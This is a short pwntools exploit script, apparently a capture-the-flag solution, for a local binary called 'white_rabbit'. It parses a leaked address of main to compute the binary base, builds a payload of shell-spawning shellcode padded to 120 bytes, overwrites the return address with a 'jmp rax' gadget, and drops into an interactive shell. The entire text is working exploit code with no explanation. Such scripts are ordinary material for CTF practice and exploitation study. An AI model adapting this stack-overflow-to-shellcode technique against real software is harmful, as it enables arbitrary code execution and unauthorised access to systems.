from pwn import *


p = process('./white_rabbit')
e = ELF('./white_rabbit')
context.arch='amd64'
# gdb.attach(p, api=True)

shellcode = asm(shellcraft.sh())



p.recvuntil(b'> ')
main = int(p.recvn(14), 16)
base_binary = main - e.sym['main']
info("BASE BINARY: %#x", base_binary)
jump_rax = base_binary + 0x00000000000010bf

# payload = sub_rsp
payload =  shellcode
payload += b'A' * (120 - len(shellcode))
payload += p64(jump_rax)
p.recvuntil(b'follow the white rabbit...\n')
p.sendline(payload)

p.interactive()